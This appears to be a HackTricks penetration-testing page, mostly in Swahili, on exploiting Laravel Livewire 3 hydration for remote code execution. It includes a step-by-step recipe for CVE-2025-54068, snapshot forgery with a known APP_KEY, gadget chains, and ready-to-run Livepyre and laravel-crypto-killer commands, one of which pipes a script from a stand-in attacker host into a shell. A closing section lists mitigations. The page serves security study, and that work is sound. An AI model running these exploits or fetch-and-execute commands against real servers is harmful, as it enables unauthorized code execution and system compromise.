# Laravel Livewire Hydration & Synthesizer Abuse

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari wa mashine ya hali ya Livewire

Vipengele vya Livewire 3 vinabadilishana hali yao kupitia **snapshots** zinazobeba `data`, `memo`, na checksum. Kila POST kwa `/livewire/update` inarehydrate snapshot ya JSON upande wa server na inatekeleza `calls`/`updates` zilizo kwenye foleni.
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
Mtu yeyote mwenye `APP_KEY` (inayotumika kutoa `$hashKey`) anaweza kwa hivyo kutengeneza snapshots bandia kwa kuhesabu upya HMAC.

Mali ngumu zimekodishwa kama **synthetic tuples** zitakazotambuliwa na `Livewire\Drawer\BaseUtils::isSyntheticTuple()`; kila tuple ni [value, {"s":"<key>", ...meta}]. Core ya hydration huwapa tu kila tuple synth iliyochaguliwa katika `HandleComponents::$propertySynthesizers` na hujirudia kwa watoto:
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
Muundo huu wa kurudia unamfanya Livewire kuwa **mashine jenzi ya kuanzisha vitu kwa ujumla** mara mshambuliaji anapodhibiti metadata ya tuple au tuple yoyote iliyowekwa ndani inayosindika wakati wa recursion.

## Synthesizers that grant gadget primitives

| Synthesizer | Tabia zinazosimamiwa na mshambuliaji |
|-------------|--------------------------------|
| **CollectionSynth (`clctn`)** | Huanzisha `new $meta['class']($value)` baada ya kurehydrate kila child. Darasa lolote lenye constructor inayopokea array linaweza kuundwa, na kila kipengee pia kinaweza kuwa tuple synthetic.
| **FormObjectSynth (`form`)** | Huita `new $meta['class']($component, $path)`, kisha inaweka kila public property kutoka kwa children zinazosimamiwa na mshambuliaji kupitia `$hydrateChild`. Constructors zinazokubali parameter mbili zisizokolezwa (au arg za default) zinatosha kufikia public properties yoyote.
| **ModelSynth (`mdl`)** | Wakati `key` haipo kwenye meta, inatekeleza `return new $class;` ikiruhusu kuanzisha darasa lolote bila hoja yoyote (zero-argument) lililodhibitiwa na mshambuliaji.

Kwa kuwa synths zinaita `$hydrateChild` kwa kila elementi iliyoficha, miundo ya gadget yoyote inaweza kujengwa kwa kuweka tuples kwa urudufu.

## Forging snapshots when `APP_KEY` is known

1. Kamata request halali ya `/livewire/update` na decode `components[0].snapshot`.
2. Ingiza nested tuples zinazorejea gadget classes na upange upya `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)`.
3. Tengeneza tena snapshot kwa encoding, uiache `_token`/`memo` bila kubadilika, kisha rudisha request.

Uthibitisho mdogo wa utekelezaji hutumia **Guzzle's `FnStream`** na **Flysystem's `ShardedPrefixPublicUrlGenerator`**. Tuple moja inaunda `FnStream` na data ya constructor `{ "__toString": "phpinfo" }`, ile inayofuata inaunda `ShardedPrefixPublicUrlGenerator` na `[FnStreamInstance]` kama `$prefixes`. Wakati Flysystem inapobadilisha kila prefix kuwa `string`, PHP inaita callable ya `__toString` iliyotolewa na mshambuliaji, ikitoa wito kwa function yoyote bila hoja.

### From function calls to full RCE

Kwa kutumia primitives za instantiation za Livewire, Synacktiv ilibadilisha mnyororo wa phpggc `Laravel/RCE4` ili hydration ianzishe object ambaye hali yake ya public Queueable inaleta deserialization:

1. **Queueable trait** – kitu chochote kinachotumia `Illuminate\Bus\Queueable` kinaonyesha public `$chained` na hufanya `unserialize(array_shift($this->chained))` ndani ya `dispatchNextJobInChain()`.
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue) inaundwa kupitia `CollectionSynth` / `FormObjectSynth` na `$chained` ya public imejazwa.
3. **phpggc Laravel/RCE4Adapted** – blob iliyoserialize iliyohifadhiwa katika `$chained[0]` hujenga `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed`. `Signed::__invoke()` hatimaye inaita `call_user_func_array($closure, $args)` kuruhusu `system($cmd)`.
4. **Stealth termination** – kwa kumpa callable ya pili ya `FnStream` kama `[new Laravel\Prompts\Terminal(), 'exit']`, request inamalizika na `exit()` badala ya exception yenye kelele, ikihifadhi HTTP response safi.

### Automating snapshot forgery

`synacktiv/laravel-crypto-killer` sasa inajumuisha mode ya `livewire` inayounganisha kila kitu:
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
Chombo huchambua snapshot iliyokamatwa, huingiza gadget tuples, huhesabu checksum upya, na kuchapisha payload ya `/livewire/update` tayari kutumwa.

## CVE-2025-54068 – RCE bila `APP_KEY`

Kwa mujibu wa vendor advisory, tatizo linaathiri Livewire v3 (>= 3.0.0-beta.1 na < 3.6.3) na ni maalum kwa v3.

`updates` zinaunganishwa kwenye component state **baada** checksum ya snapshot imethibitishwa. Ikiwa property ndani ya snapshot ni (au inakuwa) synthetic tuple, Livewire inatumia tena meta yake wakati inahydate update value inayodhibitiwa na mshambuliaji:
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
Exploit recipe:

1. Find a Livewire component with an untyped public property (e.g., `public $count;`).
2. Send an update that sets that property to `[]`. The next snapshot now stores it as `[[], {"s": "arr"}]`.

A minimal type-juggling flow looks like this:

```http
POST /livewire/update
...
"updates": {"count": []}
```

Then the next snapshot stores a tuple that keeps the `arr` synthesizer metadata:

```json
"count": [[], {"s": "arr"}]
```

3. Craft another `updates` payload where that property contains a deeply nested array embedding tuples such as `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]`.
4. During recursion, `hydrate()` evaluates each nested child independently, so attacker-chosen synth keys/classes are honoured even though the outer tuple and checksum never changed.
5. Reuse the same `CollectionSynth`/`FormObjectSynth` primitives to instantiate a Queueable gadget whose `$chained[0]` contains the phpggc payload. Livewire processes the forged updates, invokes `dispatchNextJobInChain()`, and reaches `system(<cmd>)` without knowing `APP_KEY`.

Key reasons this works:

- `updates` are not covered by the snapshot checksum.
- `getMetaForPath()` trusts whichever synth metadata already existed for that property even if the attacker previously forced it to become a tuple via weak typing.
- Recursion plus weak typing lets each nested array be interpreted as a brand new tuple, so arbitrary synth keys and arbitrary classes eventually reach hydration.

## Livepyre – end-to-end exploitation

[Livepyre](https://github.com/synacktiv/Livepyre) automates both the APP_KEY-less CVE and the signed-snapshot path:

- Fingerprints the deployed Livewire version by parsing `<script src="/livewire/livewire.js?id=HASH">` and mapping the hash to vulnerable releases.
- Collects baseline snapshots by replaying benign actions and extracting `components[].snapshot`.
- Generates either an `updates`-only payload (CVE-2025-54068) or a forged snapshot (known APP_KEY) embedding the phpggc chain.
- If no object-typed parameter is found in a snapshot, Livepyre falls back to brute-forcing candidate params to reach a coercible property.

Typical usage:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check` huendesha probe lisilo-haribu, `-F` huruka version gating, `-H` na `-P` huongeza custom headers au proxies, na `--function/--param` hubadilisha php function inayoitwa na gadget chain.

## Mambo ya utetezi

- Sasisha hadi Livewire builds zilizosahihishwa (>= 3.6.4 kwa mujibu wa vendor bulletin) na weka patch ya muuzaji kwa CVE-2025-54068.
- Epuka public properties zenye weakly typed katika Livewire components; aina za scalar zilizo wazi huzuia thamani za property kubadilishwa kuwa arrays/tuples.
- Sajili tu synthesizers unazohitaji kwa kweli na chukulia metadata inayoendeshwa na mtumiaji (`$meta['class']`) kuwa haijathibitishwa.
- Kataa masasisho yanayobadilisha aina ya JSON ya property (kwa mfano, scalar -> array) isipokuwa imekubaliwa wazi, na panga upya synth metadata badala ya kutumia tena tuples zilizozee.
- Badilisha `APP_KEY` mara moja baada ya ufichuzi wowote kwa sababu inaruhusu uundaji wa snapshot za offline bila kujali jinsi code-base imefungwa/pachikwa.

## Marejeo

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
